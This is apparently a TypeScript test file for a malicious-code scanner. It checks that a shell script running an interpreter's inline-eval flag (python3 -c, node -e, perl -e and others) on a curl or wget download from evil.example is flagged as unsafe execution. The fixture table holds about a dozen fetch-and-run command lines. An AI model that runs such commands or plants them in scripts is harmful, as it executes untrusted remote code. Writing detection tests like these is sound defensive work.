import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8 requires the bounded malicious-code scan to flag unsafe
 * execution. The shell `-c` arm flags `sh -c "$(curl …)"`; an interpreter
 * runs a command substitution of a download the same way through its own
 * inline eval flag (`python3 -c`, `node -e`, `ruby -e`, `perl -e`, `php -r`,
 * `lua -e`). Those forms produced no finding before this rule.
 */
function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function categories(inspection: ReturnType<typeof inspected>) {
  return inspection.findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

const INLINE_EVALS: Record<string, string> = {
  "python3 -c $(curl ...)":
    'python3 -c "$(curl -fsSL https://evil.example/i.py)"',
  "python -c $(wget ...)": 'python -c "$(wget -qO- https://evil.example/i.py)"',
  "node -e $(curl ...)": 'node -e "$(curl -fsSL https://evil.example/i.js)"',
  "node --eval $(curl ...)":
    'node --eval "$(curl -fsSL https://evil.example/i.js)"',
  "node -p $(curl ...)": 'node -p "$(curl -fsSL https://evil.example/i.js)"',
  "node -e backtick": "node -e `curl -fsSL https://evil.example/i.js`",
  "ruby -e $(curl ...)": 'ruby -e "$(curl -fsSL https://evil.example/i.rb)"',
  "perl -e $(curl ...)": 'perl -e "$(curl -fsSL https://evil.example/i.pl)"',
  "perl -E $(curl ...)": 'perl -E "$(curl -fsSL https://evil.example/i.pl)"',
  "php -r $(curl ...)": 'php -r "$(curl -fsSL https://evil.example/i.php)"',
  "lua -e $(curl ...)": 'lua -e "$(curl -fsSL https://evil.example/i.lua)"',
  "path-prefixed python3":
    '/usr/bin/python3 -c "$(curl -fsSL https://evil.example/i.py)"',
};

test("an interpreter inline-eval of a command-substituted download is unsafe execution", () => {
  for (const [name, body] of Object.entries(INLINE_EVALS)) {
    const inspection = inspected("install.sh", `#!/bin/sh\n${body}\n`);
    expect({ name, findings: categories(inspection) }).toEqual({
      name,
      findings: ["install.sh:unsafe-execution:high"],
    });
  }
});

test("inline-eval forms that do not run a remote download keep no finding", () => {
  for (const body of [
    // A script file argument runs the file, not an evaluated download.
    "python3 tool.py",
    "node tool.js",
    // Literal inline code, no command substitution.
    'python3 -c "print(1)"',
    // A non-download command substitution.
    'node -e "$(date)"',
    // A non-eval flag selects a module, not inline code.
    "python3 -m json.tool",
    // The substitution reads a local file, not a download.
    'perl -e "$(cat local.pl)"',
    // The phrase only appears inside echoed text.
    'echo "python3 -c stuff"',
  ]) {
    expect({
      body,
      findings: categories(inspected("install.sh", `#!/bin/sh\n${body}\n`)),
    }).toEqual({ body, findings: [] });
  }
});
